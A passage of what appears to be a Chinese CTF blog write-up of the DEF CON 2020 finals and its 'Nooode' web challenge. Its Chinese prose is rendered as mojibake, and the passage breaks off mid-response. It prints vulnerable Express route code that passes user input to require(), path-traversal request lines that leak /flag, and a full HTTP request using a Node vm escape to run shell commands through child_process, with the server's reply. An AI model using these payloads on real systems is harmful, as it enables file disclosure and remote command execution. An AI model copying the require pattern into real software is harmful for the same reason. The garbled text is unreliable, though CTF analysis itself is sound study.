æ¯”èµ›è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬è²Œä¼¼æœ‰ä¸€ä¸ªé Web AWD é¢˜ç›®æäº¤çš„ Patch æ²¡é€šè¿‡è€Œä¸»åŠæ–¹æ²¡é€šçŸ¥æˆ‘ä»¬å°±ç«‹é©¬æ–­äº†æˆ‘ä»¬è·³æ¿æœºç½‘ç»œï¼Œå¯¼è‡´å½±å“äº†æˆ‘ä»¬å¤§æ¦‚ä¸¤è½®çš„æ“ä½œã€‚</p><p>Web åé¢ä¼šå•ç‹¬åšä¸€äº›ç®€å•çš„åˆ†æï¼ŒWeb é¢˜æ¯”è¾ƒè®©æˆ‘æ„å¤–çš„æ˜¯ï¼ŒA0E ä»–ä»¬ä½¿ç”¨çš„æ˜¯é»‘åå•è¿‡æ»¤çš„æœºåˆ¶ï¼Œè¢«æˆ‘ä»¬çš„è¶…çº§å¤§å¸ˆå‚…æ‰‹åŠ¨ç»•äº†ï¼Œæ‰“äº†ä¸¤å›åˆå°±è¢«ä¿®äº†ï¼Œè¿™ä¹Ÿæˆäº†åé¢çš„ä¸€ä¸ªä¼ç¬”ã€‚ï¼ˆæŸä¸ªæ¸£ç”·ç«Ÿç„¶è·Ÿæˆ‘è¯´è¦ç¡äº†å´è¿˜åœ¨çœ‹æµé‡</p><p>Stealth Port çš„æµé‡å®˜æ–¹ä¹Ÿå…¬å¸ƒäº†ï¼š<a href="https://oooverflow.io/dc-ctf-2020-finals/stealth.txt" target="_blank" rel="noopener">https://oooverflow.io/dc-ctf-2020-finals/stealth.txt</a> ï¼Œè™½ç„¶çœ‹çš„æœ‰ç‚¹è¿·æƒ‘ï¼Œä¸è¿‡è¿˜æ˜¯å¯ä»¥çœ‹åˆ°æœ€åæˆ‘ä»¬ Web ç¡®å®æ‰“äº†ä»–ä»¬ä¸€æ³¢ã€‚</p><p>åé¢å°æ¦œç„¶ååˆ°ç»“æŸï¼ŒåŸºæœ¬å°±æ²¡æœ‰ä»€ä¹ˆæ“ä½œäº†ï¼Œå°æ¦œå‰æˆ‘çœ‹äº†ä¸€ä¸‹åˆ†æ•°å·®è·ï¼Œæˆ‘è§‰å¾—æˆ‘ä»¬æ˜¯åº”è¯¥è·Ÿ HITCON äº‰ç¬¬ä¸‰ï¼ŒPPP è·Ÿ A0E æŠ¢ç¬¬ä¸€ã€‚</p><p>ç»“æŸä¹‹åï¼Œè™½ç„¶çª—å¤–çš„é˜³å…‰æ ¼å¤–çš„åˆºçœ¼ï¼ŒåŒ—äº¬æ—©é«˜å³°ä¼´éšç€æ±½è½¦çš„é¸£ç¬›å·²ç»çº·è‡³æ²“æ¥ï¼Œä½†æ˜¯å®¤å†…æˆ‘ä»¬æ¯”è¾ƒå¹³é™ï¼Œå¤§å®¶éƒ½æ”¶æ‹¾æ”¶æ‹¾ä¸œè¥¿ï¼Œæ¡äº†æ¡åƒåœ¾æ–¹ä¾¿é˜¿å§¨æ‰“æ‰«ï¼Œéšä¾¿èŠäº†èŠçœ‹äº†çœ‹å…¶ä»–é˜Ÿå¯¹äºè¿™æ¬¡æ¯”èµ›çš„åæ§½ï¼Œç„¶åå°±éƒ½å„è‡ªå›å»ä¼‘æ¯äº†ã€‚æˆ‘å›å»åå¼€ç€ DEFCON ç›´æ’­ç­‰äº†å¥½ä¸€ä¼šï¼Œå‘ç°ä»–ä»¬è¿˜æŒºç£¨è¹­çš„ï¼Œé¡ºä¾¿æ´—äº†ä¸ªæ¾¡ï¼Œå›æ¥ç­‰å¾…ç€æ­æ™“æœ€ç»ˆç»“æœã€‚</p><p>åé¢å…¬å¸ƒæ¦œå•ï¼Œå¾—çŸ¥æˆ‘ä»¬æ˜¯æ‹¿åˆ°äº†ç¬¬å››åï¼Œè‡ªå·±å€’ä¹Ÿæ²¡æœ‰ä»€ä¹ˆç‰¹åˆ«çš„å¿ƒæƒ…ï¼ŒçŸ¥é“ä¹‹åä¹Ÿå°±æ•´ç†æ•´ç†è¿™ä¸¤å¤©çš„é¢˜ç›®ï¼Œçœ‹äº†çœ‹å¤§å®¶å¯¹äºè¿™æ¬¡æ¯”èµ›çš„è¯„è®ºï¼Œä¹‹åå°±ç¡äº†ã€‚</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20201013012759.jpeg" alt=""></p><p>å€’æ˜¯åœ¨æ­æ™“ä¸€äºŒåçš„æ—¶å€™ï¼Œä¸»åŠæ–¹åº”è¯¥æ˜¯ç‰¹åœ°åšäº†ä¸€ä¸ªåˆ†æ•°åŠ¨æ€å›¾æ¥æ˜¾ç¤ºæœ€åæ¯”èµ›çš„æ¿€çƒˆï¼Œçƒ˜æ‰˜ä¸€ä¸‹ç´§å¼ çš„æ°›å›´ï¼Œæœ€åæ˜¾ç¤º A0E ä»¥ 2 åˆ†çš„ä¼˜åŠ¿é™©èƒœ PPP æ‹¿åˆ°äº†å† å†›ï¼Œä¹Ÿæ„å‘³ç€åˆ·æ–°äº†ä¸­å›½å¤§é™†æˆ˜é˜Ÿåœ¨ DEFCON CTF ä¸Šå–å¾—çš„æœ€å¥½çš„æˆç»©ï¼Œä¹Ÿç®—è°è§è¯äº†ä¸€æ¬¡å†å²å§ XD</p><h2 id="Nooode"><a href="#Nooode" class="headerlink" title="Nooode"></a>Nooode</h2><p>é¢˜ç›®åœ°å€ï¼š<a href="https://github.com/o-o-overflow/dc2020f-nooode-public" target="_blank" rel="noopener">https://github.com/o-o-overflow/dc2020f-nooode-public</a> ï¼Œæ„Ÿå…´è¶£çš„åŒå­¦å¯ä»¥å»åˆ†æå¤ç°ä¸€ä¸‹ã€‚</p><p>Web é¢˜é—®é¢˜ä¸»è¦æ˜¯åœ¨ public-nooode/routes/config.js æ–‡ä»¶ä¸­å­˜åœ¨ä¸€å¤„ BackDooor </p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">router.post(<span class="hljs-string">'/validated/:lib?/:f?'</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>) </span>{</span><br><span class="line">  <span class="hljs-keyword">let</span> config = res.locals.config;</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">if</span> (!req.params.lib) req.params.lib = <span class="hljs-string">"json-schema"</span></span><br><span class="line">  <span class="hljs-keyword">if</span> (!req.params.f) req.params.f = <span class="hljs-string">"validate"</span></span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">let</span> jsonlib = <span class="hljs-built_in">require</span>(req.params.lib)</span><br><span class="line">  <span class="hljs-keyword">let</span> valid = jsonlib[req.params.f](req.body)</span><br><span class="line">  <span class="hljs-keyword">if</span> (!valid) {</span><br><span class="line">    res.send(<span class="hljs-string">"validator failed"</span>);</span><br><span class="line">    <span class="hljs-keyword">return</span></span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">let</span> p;</span><br><span class="line">  <span class="hljs-keyword">if</span> (config.path) { </span><br><span class="line">    p = config.path;</span><br><span class="line">  } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (config.filepath) {</span><br><span class="line">    p = config.filepath;</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">let</span> data = fs.readFileSync(p).toString()</span><br><span class="line">  <span class="hljs-keyword">try</span> {</span><br><span class="line">    data = <span class="hljs-built_in">JSON</span>.parse(data)</span><br><span class="line">    <span class="hljs-keyword">if</span> (_.isEqual(req.body, data))</span><br><span class="line">      res.json(data)</span><br><span class="line">    <span class="hljs-keyword">else</span></span><br><span class="line">    res.send({ <span class="hljs-string">"validator"</span>: valid, <span class="hljs-string">"data"</span>:data, <span class="hljs-string">"msg"</span>: <span class="hljs-string">"data is corrupted"</span>})</span><br><span class="line">  } <span class="hljs-keyword">catch</span> {</span><br><span class="line">    res.send({ <span class="hljs-string">"validator"</span>: valid, <span class="hljs-string">"data"</span>:data})</span><br><span class="line">  }</span><br><span class="line">});</span><br></pre></td></tr></tbody></table></figure><p></p><p>æ¯”è¾ƒç†Ÿæ‚‰çš„åŒå­¦å¯ä»¥ä¸€çœ¼å°±çœ‹çœ‹åˆ°é—®é¢˜æ‰€åœ¨äº†ã€‚</p><p>ç”±äºå®˜æ–¹æä¾›çš„æ˜¯æ•´åœºæ¯”èµ›æ‰€æœ‰çš„æµé‡åŒ…è¿‡å¤§ï¼Œå¹¶æ²¡æœ‰å…·ä½“åˆ†ç±»ï¼Œæ•´ä¸ªæµé‡åŒ…å¤šè¾¾ 200 GB ï¼Œè€Œä¸”å¯¹äº Web é¢˜ç›®æ¥è¯´ï¼ŒåŸºæœ¬å‡ ä¸ªæµé‡åŒ…å°±èƒ½æ‹¿åˆ°å¤§å¤šæ•°çš„ Payload äº†ï¼Œæ‰€ä»¥æˆ‘æ‹¿äº†æˆ‘æ‰‹å¤´ä¸Šå½“æ—¶ä¸‹è½½çš„åŸºæœ¬åˆ†éƒ¨äº†å¤§å¤šæ•°æ—¶é—´æ®µçš„æµé‡åŒ…ï¼Œæå–äº†ä¸€ä¸‹ HTTP æµé‡å¹¶è¿›è¡Œäº†ç®€å•ç»Ÿè®¡å¤„ç†ï¼Œå¹¶æŒ‰ç…§å‡ºç°çš„æ¬¡æ•°è¿›è¡Œäº†ä»é«˜åˆ°ä½çš„æ’åºï¼Œå¾—åˆ°äº†ä»¥ä¸‹çš„ç»“æœï¼š</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20201013015810.png" alt=""></p><p>å¥‡æ€ªï¼Œä¸­é—´å¥½åƒæ··å…¥äº†ä»€ä¹ˆå¥‡æ€ªçš„ä¸œè¥¿ï¼ˆ</p><p>å½“ç„¶å…¶ä»–æµé‡åŒ…æˆ–è®¸è¿˜å¯èƒ½å­˜åœ¨ä¸€äº›å…¶ä»–çš„ Payload ï¼Œä½†æ˜¯åŸºæœ¬è¯¥é¢˜æ‰€æœ‰çš„ç‚¹éƒ½åœ¨è¿™äº†ã€‚å¹¶ä¸”æ¯ä¸ªæµé‡åŒ…éƒ½å……æ–¥ç€å¤§é‡çš„åƒåœ¾æµé‡ï¼Œæ¥ä¸‹æ¥å°±æ˜¯åƒåœ¾æµé‡å¤§èµï¼ŒåŸæ¥ä½ å°±æ˜¯ä¸­å›½æ–‡åŒ–å®£ä¼ å¤§ä½¿ï¼Ÿä¸ç”¨æˆ‘å¤šè¯´å°±çŸ¥é“äº†å§ï¼Œè·ŸæŸä¸ªå¸ˆå‚…æ‰“è¿‡ AWD çš„éƒ½åº”è¯¥çŸ¥é“æ˜¯è°å‘çš„è¿™äº›åƒåœ¾æµé‡ã€‚</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20201013020131.png" alt=""></p><h3 id="Require"><a href="#Require" class="headerlink" title="Require"></a>Require</h3><p>ä¸€å¼€å§‹å¤§å¤šé˜Ÿä¼éƒ½æ‰“çš„æ˜¯<code>require</code>ç›´æ¥åŒ…å«çš„ç‚¹ï¼Œç”±äºé¢˜ç›®å¼€äº† debug æŠ¥é”™ï¼Œåœ¨ä½¿ç”¨<code>require</code>åŒ…å« flag çš„æ—¶å€™ä¼šç›´æ¥æŠ¥é”™å›æ˜¾ flag ï¼Œå¦‚ä¸‹ 000AAA å³ä¸º flag</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Invalid or unexpected token<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">pre</span>&gt;</span>/flag:1</span><br><span class="line">000AAAA</span><br><span class="line">^^^</span><br><span class="line"></span><br><span class="line">SyntaxError: Invalid or unexpected token</span><br><span class="line">    at wrapSafe (internal/modules/cjs/loader.js:1070:16)</span><br><span class="line">    at Module._compile (internal/modules/cjs/loader.js:1120:27)</span><br><span class="line">    at Object.Module._extensions..js (internal/modules/cjs/loader.js:1176:10)</span><br><span class="line">    at Module.load (internal/modules/cjs/loader.js:1000:32)</span><br><span class="line">    at Function.Module._load (internal/modules/cjs/loader.js:899:14)</span><br><span class="line">    at Module.require (internal/modules/cjs/loader.js:1042:19)</span><br><span class="line">    at Module.Hook._require.Module.require (/usr/local/lib/node_modules/pm2/node_modules/require-in-the-middle/index.js:80:39)</span><br><span class="line">    at require (internal/modules/cjs/helpers.js:77:18)</span><br><span class="line">    at /service/routes/config.js:21:17</span><br><span class="line">    at Layer.handle [as handle_request] (/service/node_modules/express/lib/router/layer.js:95:5)<span class="hljs-tag">&lt;/<span class="hljs-name">pre</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>ä½¿ç”¨è¿™ä¸ªæ€è·¯çš„ payload å°±æœ‰å¾ˆå¤šå˜ç§äº†ï¼Œä¾‹å¦‚ï¼š</p><ul><li><code>POST /config/validated/..%2F..%2F..%2F..%2F..%2F..%2F..%2Fflag HTTP/1.1</code> åŠ ä¸Šä¸€äº› body å†…å®¹ã€æˆ–è€…è¿›è¡Œå…¨ urlencode ã€åˆæˆ–è€…å†è·¯å¾„åé¢åŠ ä¸€ä¸ªè·¯å¾„<code>POST /config/validated/%2Fflag/a HTTP/1.1</code></li><li><code>POST /config/validated/%2ffl%61g HTTP/1.1</code></li><li><code>POST /config/validated/%2fproc%2fself%2froot%2ffl%61g HTTP/1.1</code></li></ul><h3 id="vm"><a href="#vm" class="headerlink" title="vm"></a>vm</h3><p>è¿˜æœ‰å°±æ˜¯å¯ä»¥é€šè¿‡å†…ç½®çš„ vm lib ï¼Œç”±äº vm lib é€ƒé€¸å·²ç»è¢«å¼„çƒ‚äº†ï¼ŒåŸºæœ¬èƒ½æ‰¾åˆ°å¯ä»¥ç›´æ¥åˆ©ç”¨çš„ exp ç›´æ¥æ‹¿ flag</p><p></p><figure class="highlight hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">POST</span> <span class="hljs-string">/config/validated/vm/runInNewContext</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: zedd.vv:4017</span><br><span class="line"><span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:81.0) Gecko/20100101 Firefox/81.0</span><br><span class="line"><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="hljs-attribute">Connection</span>: close</span><br><span class="line"><span class="hljs-attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="hljs-attribute">Content-Type</span>: application/json</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 160</span><br><span class="line"></span><br><span class="line">["const process = this.constructor.constructor('return this.process')(); process.mainModule.require('child_process').execSync('cat /f'+'l'+'a'+'g').toString()"]</span><br></pre></td></tr></tbody></table></figure><p></p><p></p><figure class="highlight hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="hljs-number">200</span> OK</span><br><span class="line"><span class="hljs-attribute">Content-Type</span>: application/json; charset=utf-8</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 85</span><br><span class="line"><span class="hljs-attribute">ETag</span>: W/"55-/Dqsanp9FGAj8iXHTLNo/PbZBTc"</span><br><span class="line"><span class="hljs-attribute">Date</span>: Tue, 13 Oct 2020 10:52:05 GMT</span><br><span class="line"><span class="hljs-attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line">{"validator":"000AAAA\n","data":{"treasure":"data-piece2"},"msg":"data is 